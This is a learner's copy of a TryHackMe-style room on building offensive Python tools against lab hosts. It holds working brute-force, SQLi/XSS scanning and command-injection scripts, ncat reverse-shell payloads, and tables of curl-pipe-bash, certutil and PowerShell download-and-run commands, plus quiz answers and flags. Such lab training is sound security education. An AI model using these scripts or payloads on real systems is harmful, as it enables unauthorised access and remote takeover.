#customtooling
# Custom Tooling Using Python

Creating custom tooling for application testing using Python.

# Task 1 - Introduction

Creating your own custom tooling is critically important for web application red teaming, as you rarely find a tool or plugin that will do exactly what you need. This then calls for you to develop custom tooling! In this room, we will showcase different ways you can approach this problem. Each option is unique and has its own benefits and drawbacks.

In this room, we will focus on using **code** to create tools and exploits. Code is the most versatile option, as it allows you to create brand new software specifically for your needs. Being able to use code also allows you to take existing tools and exploits to customise them to your needs. While we will showcase using Python in this room, the principles can be applied to any coding language of your choice. Let's dive in and use code to create our very own custom tools and exploits!

## Prerequisites

- [Python Basics](https://tryhackme.com/room/pythonbasics)
- [Python for Pentesters](https://tryhackme.com/room/pythonforcybersecurity)

## Learning Objectives

- Understand how coding can be used to create custom tools and exploits
- Understand how to best choose a coding language for your specific custom needs
- Learn how to create custom tools using Python
- Learn how to create custom exploits using Python
- Learn how to craft your own web scanner, brute-forcing tool, and automated RCE exploit using Python
- Learn about the OpSec that you should be aware of when creating your own tooling

## Starting the Machine

Deploy the target VM attached to this task by pressing the **Start Machine** button below. After obtaining the machine's generated IP address, you can either use the AttackBox or your own VM connected to TryHackMe's VPN. to you can either use the **AttackBox** by pressing the **Start AttackBox** button on top of the page, or use your own VM connected to TryHackMe's VPN.

# Task 2 - Using a Coding Language for Custom Tooling

## Why Create Your Own Tools?

When you go up against a web application during a red team, relying solely on existing tools may not always be sufficient. While there are many open-source and commercial options available, they may not fully align with the specific needs of your engagement. Furthermore, most of these tools have already been signed, meaning the likelihood of detection is quite high. Creating custom tooling allows you to:

- Tailor functionality to your specific needs
- Automate exploit and create automated workflows to perform repetitive tasks
- Bypass detection mechanisms
- Modify existing exploits and tools to suit your exact needs

Coding is the ultimate form of this. It allows you to either create something entirely from scratch or build a new tool from existing parts.

## To Script or Not to Script

When selecting a language for building your custom tools, one of the primary considerations is whether to use a scripting language or a compiled language. While it is good to be able to do both, it is worth considering which is best for your current situation given their advantages and trade-offs:

|   |   |   |
|---|---|---|
|**Decision Factor**|**Scripting Languages (Python, Ruby, JavaScript)**|**Compiled Languages (Go, C++, .NET)**|
|**Speed of Development**|Fast development and testing as code is immediately interpreted and executed|Slower development due to compilation requirements|
|**Performance**|Generally slower as interpretation only happens at runtime|Faster execution as it can be compiled and optimised into machine code|
|**Ease of Use**|Easier to create and modify on the fly|More complex to modify and stricter syntax complexities|
|**Portability**|While it can be executed cross-platform, it relies on the specific platform having the interpreter available.|While it usually creates platform-specific builds, the compiled version can often execute using only the natively available software on the target system.|
|**Detection and Evasion**|Can be easily obfuscated but may trigger AV or EDR due to signatures in the scripting patterns|More difficult to analyse and can be leveraged to bypass detection mechanisms|
|**OS Interfacing**|Good for automation and scripting interactions with other tools|Provided lower-level access to system resources|

## Choosing the Right Language

Different coding languages have unique strengths and weaknesses when creating custom tooling and exploits. Let's take a look at a comparison:

|   |   |   |   |   |
|---|---|---|---|---|
|**Language**|**Type**|**Key Features**|**Advantages**|**Disadvantages**|
|**Python**|Scripting|Extensive libraries and dynamic typing|Easy to learn and allows for fast prototyping|Slower execution and often easily detected by AVs or EDRs|
|**JavaScript**|Scripting|Browser-based and easy-to-perform threading|Useful for web-based exploits and widely supported in web applications|It is not suitable for low-level system tasks and has a high detection rate|
|**Go (Golang)**|Compiled|Statically types and provides efficient concurrency support|Fast executing and easy cross-compilation|Created larger binary sizes and has fewer security-specific libraries currently|
|**.NET (C#)**|Compiled|Windows-focused and integrates well with system APIs|Good for Windows exploitation and has easy obfuscation techniques|Limited cross-platform compatibility and requires the .NET runtime|
|**C++**|Compiled|High performance and allows for direct memory manipulation|Very fast execution and grants low-level system access, which is great for creating stealthy tools|Complex syntax and is harder to debug|

## Popular Python

Among these options, Python remains one of the most widely used languages for building custom security tools and exploits. Some of the main reasons for its popularity are:

- It allows for fast prototyping and development.
- Python has an extensive library list for things like networking, web interaction, and automation.
- Python's simple syntax makes it easy to develop and modify tools quickly.
- Python scripts can run on any operating system with the Python interpreter installed. Using libraries such as py2exe, you could even create a compiled binary of your Python code to execute on Windows systems that do not have the Python interpreter.
- Given Python's popularity, there is large community support for it, making it easy to modify it using existing tools.

Choosing the right coding language depends on the specific requirements of your custom tooling. While Python offers rapid development and strong community support, compiled languages like Go and .NET can provide better stealth and performance. By understanding these trade-offs, you can select the best language for the task at hand and develop highly effective custom tools for web application red teaming. In this room, we will show how Python can be used. However, you should be able to perform all the tasks in this room using any coding language of your choice.

## Answer the questions below

### Does a scripting language perform better than a compiled language? (Yea/Nay)

 Nay

### Which compiled language is easy to cross-compile?

 Go
### Which scripting language is best suited for web-based exploits?

JavaScript


# Task 3 - Developing a Brute-Forcing Tool

Now that we have understood the importance of Python for custom tooling, let’s explore how we can develop a brute-forcing tool to bypass authentication. Brute-force attacks involve trying multiple username-password combinations until the correct credentials are found. While these attacks are commonly mitigated by rate limiting and account lockout mechanisms, they still remain an easy-to-do job for hackers.

## Essential Commands

Before we start coding, let's go over some essential functions and techniques used in brute-forcing:

- **Requests library**: A Python library that facilitates sending HTTP requests and receiving responses from web apps. It has built-in functions to send custom headers like user-agent, HTTP method, and more. 
- **Handling responses**: Identifying successful logins based on HTTP status codes, redirects, or content patterns, which further helps to identify valid credentials.
- **String library**: Built-in functions from the String module make it easy to generate letter sequences, perform text formatting and manipulation, and more.

## Practical

In order to understand the essence of custom tooling using Python, consider a web application hosted at `http://python.thm/labs/lab1`. Visit the application, and you will see the following login panel.

Note: Please remember to add `python.thm` to your **hosts** file to access the website (as already mentioned in Task 1).

As a pentester, your task is to bypass the authentication mechanism and get access to the main dashboard. Suppose you discover that the username is `admin` and the password is a 4-digit numeric value from the system logs or the frontend. One option is to manually try different combinations, but this is inefficient. A more viable approach is to use Python to automate the brute-force attack and try to attempt all possible 4-digit passwords.

Now, we will write a simple Python script to automate brute-force attacks. This script will attempt different password combinations against the server and, based on the response, determine whether a combination is valid. In the AttackBox, create a new script called `bruteforce.py` with the following code:

```python
import requests

url = "http://python.thm/labs/lab1/index.php"

username = "admin"

# Generating 4-digit numeric passwords (0000-9999)
password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
```

```
root@ip-10-82-83-1:~# python3 exp.py 
[-] Attempted: 1231
[-] Attempted: 1232
[-] Attempted: 1233
[+] Found valid credentials: admin:1234

```






```python
import requests
import string

url = "http://python.thm/labs/lab1/index.php"
username = "Mark"

def brute_force():
    # Loop through digits 000 to 999
    for i in range(1000):
        digit_part = str(i).zfill(3)
        
        # Loop through uppercase letters A to Z
        for letter in string.ascii_uppercase:
            password = f"{digit_part}{letter}"
            
            data = {"username": username, "password": password}
            
            try:
                response = requests.post(url, data=data)
                
                # Check if the login was successful
                # (Assuming "Invalid" is the keyword for failure)
                if "Invalid" not in response.text:
                    print(f"\n[+] Success! Flag found with credentials: {username}:{password}")
                    print(f"--- Response Content ---\n{response.text}\n-----------------------")
                    return # Stop after finding the flag
                else:
                    print(f"[-] Trying: {password}", end="\r")
                    
            except requests.exceptions.RequestException as e:
                print(f"\n[!] Connection error: {e}")
                return

if __name__ == "__main__":
    print(f"Starting brute force for user: {username}...")
    brute_force()
```

```
root@ip-10-82-83-1:~# python3 exp2.py 
Starting brute force for user: Mark...
[-] Trying: 110Z
[+] Success! Flag found with credentials: Mark:111A
--- Response Content ---

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link href="assets/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">

<div class="container text-center mt-5">
    <h2>Welcome,  <strong>Mark</strong>!</h2>
    <div class="alert alert-success mt-3">
        \U0001f389 Congratulations! Here is your flag: <strong>THM{Brute_Force_Success_Mark001}</strong>
    </div>
    <a href="index.php" class="btn btn-danger">Logout</a>
</div>

</body>
</html>

-----------------------

```


# Task 4 - Developing a Vulnerability Scanner

Now that we have explored how Python can automate brute-force attacks, let's move on to another important aspect of web security testing, which is vulnerability scanning. Web apps contain various flaws that can be exploited to gain unauthorised access, extract sensitive information, or even gain RCE. In this task, we will create a web scanner that will try one server-side vulnerability, SQLi and one client-side vulnerability, XSS.  

## Essential Commands

Before we start coding, let's cover some important Python libraries/commands that we will use:

- **Regular expressions (re)**: The `re` library in Python is used for pattern matching within responses. We can use regex to identify and match the content response against a set of error messages.
- **Threading**: Running scans sequentially is slow, so we use multi-threading to send multiple requests simultaneously, making our scanner faster and more efficient. 

## Practical

Now, we will write code to prepare our vulnerability scanner, but first visit the page `http://python.thm/labs/lab2/greetings.php?id=2`, which would show a greeting message based on user ID as shown below:

As discussed earlier in this task, our code will focus on detecting two common vulnerabilities, SQLi and XSS. For SQLi, our logic is simple; we will try different payloads, such as `'`, `UNION SELECT 1,2,3 --`, `--`, etc., and then check the response for error messages like "**SQL syntax error**", "**Unknown column**", or "**MySQL server error**". If any of these errors appear, it indicates a potential SQL injection vulnerability.

Similarly, for XSS, we will inject payloads like `<script>alert("Hacked")</script>` and check if the same payload is reflected in the response without being sanitised. The application may be vulnerable to XSS attacks if it appears as is.

In this task, we are not testing advanced payloads, as dedicated tools like sqlmap (also written in Python) perform advanced automated SQL injection testing. Our goal is to understand the basics of scanning and how Python can be used to detect vulnerabilities.

Now, we will write a simple Python script to scan the web application. In the AttackBox, create a new script `scanner.py` and copy the following code:

```python
import requests
import re
import threading

url = "http://python.thm/labs/lab2/greetings.php?id="

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def scan_payload(vuln_type, payload):
    response = requests.get(url, params={"id": payload})
    content = response.text.lower()

    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
        print(f"[+] Potential SQL injection detected with payload: {payload}")

    elif vuln_type == "XSS" and payload.lower() in content:
        print(f"[+] Potential XSS detected with payload: {payload}")

threads = []
for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        threads.append(t)
        t.start()

# Wait for all threads to finish
for t in threads:
    t.join()
```

## Key Areas in the Code 

- **Target URL**: The script sends `GET` requests to the web application, trying different inputs against the `id` parameter. The target URL is dynamically updated with different payloads using `params={"id": payload}` to check if the application processes input securely.
- **Defining payloads**: The script contains predefined payloads specifically designed to test for SQL injection and XSS vulnerabilities. SQL injection payloads attempt to manipulate database queries with inputs like `' OR '1'='1`, while XSS payloads insert JS such as `<script>alert('XSS')</script>` to check if it gets executed in the browser. 
- **Detecting vulnerabilities**: The scanner sends payloads to the application and examines the response for common database error messages. If the response contains phrases like "**SQL syntax error**", "**Unknown column**", or "**MySQL server error**", it indicates that the application is processing user input directly in SQL queries without proper validation. Similarly, the application is vulnerable to XSS if the payload is reflected in the page without escaping or encoding. 
- **Executing scans with multi-threading**: As a pentester, it is important to scan the website efficiently by speeding up the vulnerability scanning process. In this script, we are using multi-threading with `threading.Thread` to test multiple payload tests simultaneously. Instead of executing each payload one by one, threads allow numerous requests to be sent simultaneously, significantly reducing the scanning time.


## Executing the Script

Navigate to the terminal and execute the command `python3 scanner.py`. Upon execution, the script will try all the possible payloads and display whether it finds any SQL injection or XSS at the specified endpoint. 

Terminal

```shell-session
ubuntu@tryhackme:~$ python3 scanner.py
[+] Potential XSS detected with payload: <script>alert('Hacked')</script>
[+] Potential XSS detected with payload: '><img src=x onerror=alert('Hacked')>
```

After executing the above code against the endpoint, we see that it finds two XSS vulnerabilities. Now, we can check if it is a false positive by manually using any of the above payloads and replacing it with the `id` parameter on our web app to execute the XSS attack. In this case, the vulnerable URL will be `http://python.thm/labs/lab2/greetings.php?id=%3Cscript%3Ealert(%27Hacked%27)%3C/script%3E` , as shown below:


After executing the above payload, we will see a pop-up reflecting the injected payload, showing that the site is vulnerable to XSS. To understand how you can further explore XSS attacks, you can visit the [XSS](https://tryhackme.com/room/axss) room. 

To answer the following questions, consider the endpoint `http://python.thm/labs/lab2/departments.php?name=` that accepts the **name** as an input parameter and shows the relevant department, as shown below:

## Answer the questions below

### How many vulnerabilities will be identified if we use the above scanner.py script with the updated URL `http://python.thm/labs/lab2/departments.php?name=`? (without changing the original code)

 0

### After tweaking the above script to use the appropriate GET parameter, how many payloads are found? (with changing the original code)

2

### Which of the following is the valid type of vulnerability? Write the correct option only.

a) CSRF  
b) SQL injection  
c) Prototype Pollution  
d) XSS

b

### What is the name of the renowned library that is used to make concurrent requests to an endpoint?

Threading

# Task 5 Creating a Basic Exploit

## Exploit Development Using Python

Python is one of the most widely used languages for exploit development due to its flexibility and powerful libraries. Python is often used to automate exploitation tasks such as:

- Identifying and exploiting injection vulnerabilities (e.g.,  SQLi, SSTI)
- Exploiting Remote Code Execution (RCE)
- Automating post-exploitation (e.g., reverse shells, privilege escalation)

Once an RCE vulnerability is identified, we can execute various commands for reconnaissance, privilege escalation, and lateral movement. Here are common commands used on **Linux** and **Windows** targets:

**Linux RCE Commands**

|Command|Description|
|---|---|
|`whoami`|Displays the user executing the command|
|`id`|Shows user and group IDs|
|`uname -a`|Prints system details|
|`cat /etc/passwd`|Reads the system’s password file (if permissions allow)|
|`ls -la`|Lists files with permissions and ownership|
|`curl http://attacker.thm/shell.sh \| bash`|Downloads and executes a shell script|
|`nc -e /bin/bash <attackbox_ip> <port>`|Establishes a reverse shell|
|`python3 -c 'import pty; pty.spawn("/bin/bash")'`|Upgrades to an interactive shell|

**Windows RCE Commands**

|Command|Description|
|---|---|
|`whoami`|Shows the current user|
|`hostname`|Displays system hostname|
|`ipconfig /all`|Prints network information|
|`net user`|Lists local users|
|`tasklist`|Shows running processes|
|`certutil -urlcache -f http://attacker.thm/shell.exe shell.exe`|Downloads a malicious executable|
|`powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.thm/shell.ps1')"`|Executes a remote PowerShell payload|

## Writing an Exploit Script

The target web application has a vulnerable endpoint that allows user-controlled command execution:

```
http://python.thm/labs/lab3/execute.php?cmd=<command>
```

Our goal is to **write a Python script to exploit this endpoint** and automate command execution.

**Basic Exploit Script**

The following Python script sends a malicious payload to the vulnerable web application and retrieves the command output:

```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

# Command to execute
command = "whoami"

# Construct the exploit request
response = requests.get(TARGET_URL + command)

# Print the response
if response.status_code == 200:
    print("[+] Command Output:")
    print(response.text)
else:
    print("[-] Exploit failed. HTTP Status:", response.status_code)
```
## Enhancing the Exploit

Instead of executing a single command, we can create an **interactive shell** to run multiple commands dynamically.

```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

print("[+] Interactive Exploit Shell")
while True:
    cmd = input("Shell> ")  
    if cmd.lower() in ["exit", "quit"]:
        break
    
    response = requests.get(TARGET_URL + cmd)
    
    if response.status_code == 200:
        print(response.text)
    else:
        print("[-] Exploit failed")
```

```
python3 exp6.py 
[+] Interactive Exploit Shell
Shell> ls
execute.php
flag.txt
index.php

Shell> cat flag.txt
THM{basic_exploit_using_python}
Shell> 

```

## Launching a Reverse Shell

Instead of executing commands one by one, we can use the exploit to **send a reverse shell payload**, which will give us persistent access.

First, we have to start a reverse shell listener in our VM or AttackBox that will catch the connection using the command:

```sh
nc -lvnp 4444
```

**Reverse Shell Payload (Linux)**

We will be using the following payload in the next exploit script:

```sh
ncat ATTACKBOX_IP 4444 -e /bin/bash
```

**Automating Reverse Shell Execution**

We can modify our exploit script to send a reverse shell automatically:

```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

# Reverse shell payload (Change ATTACKBOX_IP)
payload = "ncat 10.81.99.40 4444 -e /bin/bash"

print("[+] Sending reverse shell payload...")

requests.get(TARGET_URL + payload)
```

Terminal

```shell-session
user@tryhackme:~$ python3 rce.py
[+] Sending reverse shell payload...
```

If successful, the shell should connect back to our listener.

Terminal

```shell-session
listening on [any] 4444 ...
connect to [ATTACKBOX_IP] from (UNKNOWN) [10.81.138.78] 48162
whoami
www-data
cat flag.txt
THM{******************}
```

```
 nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.81.138.78 42330
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
ls
execute.php
flag.txt
index.php
cat flag.txt
THM{basic_exploit_using_python}

```

# Task 6 Task Automation

## Automating Session Management

When automating attacks against web applications, **managing session persistence** is crucial. Many web applications rely on **session-based authentication**, where a session cookie is assigned after login and must be sent with every request. Instead of manually handling session cookies, Python's `requests.Session()` class automates cookie management, allowing an exploit to:

- Avoid manual login steps when testing a target
- Maintain persistence even if the session expires
- Help developers reproduce the exploit by automating complex interactions

**Maintaining the Session**

Instead of sending credentials with every request, we can **log in once**, store the session, and use it for future interactions.

```python
import requests

# Create a session object
session = requests.Session()

# Log in and maintain the session automatically
login_url = "http://python.thm/labs/lab4/login.php"
credentials = {"username": "admin", "password": "password123"}

response = session.post(login_url, data=credentials)

if "Welcome" in response.text:
    print("[+] Login successful. Session cookies are stored automatically!")
else:
    print("[-] Login failed.")
```

After logging in, the `session` object **remembers authentication cookies**, allowing us to send authenticated requests **without manually handling cookies**.

## Automation From Login to Code Execution

A **well-automated exploit** should handle:

1. **Bypassing authentication** via brute-forcing the login panel
2. **Maintaining access** by automating **session management**
3. **Escalating privileges** using **RCE to gain a reverse shell**

Since `login.php` does not have brute force protection, we can **automate credential guessing**.

```python
def brute_force_login():
    """Brute forces the login panel."""
    session = requests.Session()

    wordlist = ["password", "admin123", "letmein", "qwerty", "12345"]

    for password in wordlist:
        print(f"[*] Trying password: {password}")
        data = {"username": USERNAME, "password": password}
        response = session.post(LOGIN_URL, data=data)

        if "Welcome" in response.text:
            print(f"[+] Login successful! Username: {USERNAME}, Password: {password}")
            return session

    print("[-] Brute force failed.")
    return None
```

Once logged in, we manipulate the vulnerable **drop-down menu** to inject arbitrary commands.

```python
def command_injection(session, command):
    """Exploits command injection by sending a modified drop-down value."""
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if response.status_code == 200:
        print(f"[+] Command Output:\n{response.text}")
    else:
        print("[-] Exploit failed.")

if session:
    command_injection(session, "id")
    command_injection(session, "whoami")
```

Now that we can execute arbitrary commands, we use this to **spawn a reverse shell**.

```python
def get_reverse_shell(session, attacker_ip="ATTACKER_IP", attacker_port=4444):
    """Sends a reverse shell payload."""
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"

    print("[+] Sending reverse shell payload...")
    session.post(EXECUTE_URL, data={"cmd": payload})

if session:
    get_reverse_shell(session, "ATTACKER_IP", 4444)
```

The following script combines **session automation, command injection, and privilege escalation**.

```python
import requests

LOGIN_URL = "http://python.thm/labs/lab4/login.php"
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
USERNAME = "admin"
PASSWORD = "password123"

def authenticate():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})

    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session
    return None

def execute_command(session, command):
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = authenticate()

    print(f"[+] Output:\n{response.text}")

def get_reverse_shell(session, attacker_ip, attacker_port):
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    execute_command(session, payload)

session = authenticate()
if session:
    execute_command(session, "whoami")
    get_reverse_shell(session, "10.81.99.40", 4444)
```

Now, having started a listener with `nc -lvnp 4444` and saved the script as exploit.py, and run it using python3 as shown below:

Terminal

```shell-session
user@tryhackme:~$ python3 exploit.py
[+] Authentication successful.
[+] Output:

<!DOCTYPE html>
<html lang="en">
[--snip--]
```

If successful, the shell should connect back to our listener.

Terminal

```shell-session
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.81.138.78] 42810
whoami
www-data
ls
*********************.txt
dashboard.php
index.php
login.php
logout.php
cat *********************.txt
THM{*********************}
```

# To do

## Pre

- https://tryhackme.com/room/pythonbasics
- https://tryhackme.com/room/pythonforcybersecurity

## Post

	